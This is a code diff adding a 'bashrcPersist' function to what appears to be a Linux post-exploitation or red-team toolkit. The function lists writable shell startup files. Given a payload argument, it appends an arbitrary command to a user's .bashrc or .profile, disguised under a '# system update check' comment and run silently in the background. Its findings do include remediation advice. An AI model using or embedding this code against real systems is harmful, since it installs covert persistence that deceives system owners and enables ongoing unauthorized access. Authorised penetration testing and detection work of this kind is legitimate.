@@ -159,3 +159,80 @@ systemctl start ${name}.service 2>/dev/null && echo "[+] Service started" || ech
 
   return { output: output.join("\n"), findings }
 }
+
+export async function bashrcPersist(args: string[], timeout: number): Promise<HookResult> {
+  const findings: Finding[] = []
+  const output: string[] = ["=== Bashrc/Profile Persistence ==="]
+  const payload = argVal(args, "--payload")
+  const targetUser = argVal(args, "--target-user")
+
+  const script = `
+echo "--- Shell RC Files ---"
+for dir in /root /home/*; do
+  user=$(basename "$dir")
+  if [ -d "$dir" ]; then
+    for rc in .bashrc .bash_profile .profile .zshrc .zprofile; do
+      if [ -f "$dir/$rc" ]; then
+        writable=$([ -w "$dir/$rc" ] && echo "WRITABLE" || echo "read-only")
+        echo "  $dir/$rc ($writable)"
+      fi
+    done
+  fi
+done
+echo ""
+echo "--- Global Profiles ---"
+for f in /etc/profile /etc/bash.bashrc /etc/profile.d/*.sh; do
+  if [ -f "$f" ]; then
+    writable=$([ -w "$f" ] && echo "WRITABLE" || echo "read-only")
+    echo "  $f ($writable)"
+  fi
+done
+echo ""
+${payload ? `
+echo "--- Installing Bashrc Persistence ---"
+target_dir="${targetUser ? (targetUser === "root" ? "/root" : `/home/${targetUser}`) : "$HOME"}"
+for rc in "$target_dir/.bashrc" "$target_dir/.profile"; do
+  if [ -f "$rc" ] && [ -w "$rc" ]; then
+    echo "" >> "$rc"
+    echo "# system update check" >> "$rc"
+    echo "${payload} &>/dev/null &" >> "$rc"
+    echo "[+] Payload appended to $rc"
+    break
+  fi
+done
+` : `echo "[*] Dry run — pass --payload <cmd> to install. Use --target-user <user> to target specific user."
+`}
+`
+
+  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
+  output.push(r.stdout || r.stderr)
+
+  const writableRcs = (r.stdout.match(/WRITABLE/g) || []).length
+  if (writableRcs > 0) {
+    findings.push({
+      checkId: "LNX-BASHRC-001",
+      provider: "linuxhook",
+      severity: "MEDIUM",
+      status: "IDENTIFIED",
+      resource: "shell_rc",
+      title: "Writable shell RC files found",
+      details: `${writableRcs} writable shell RC file(s) available for persistence injection`,
+      remediation: "Monitor shell RC files for unauthorized modifications. Use file integrity monitoring (AIDE/Tripwire).",
+    })
+  }
+
+  if (r.stdout.includes("[+] Payload appended")) {
+    findings.push({
+      checkId: "LNX-BASHRC-002",
+      provider: "linuxhook",
+      severity: "HIGH",
+      status: "INSTALLED",
+      resource: "shell_rc",
+      title: "Shell RC persistence installed",
+      details: "Payload appended to shell RC file — executes on every interactive shell login",
+      remediation: "Review .bashrc, .profile, .bash_profile, .zshrc for unauthorized entries. Remove injected lines.",
+    })
+  }
+
+  return { output: output.join("\n"), findings }
+}
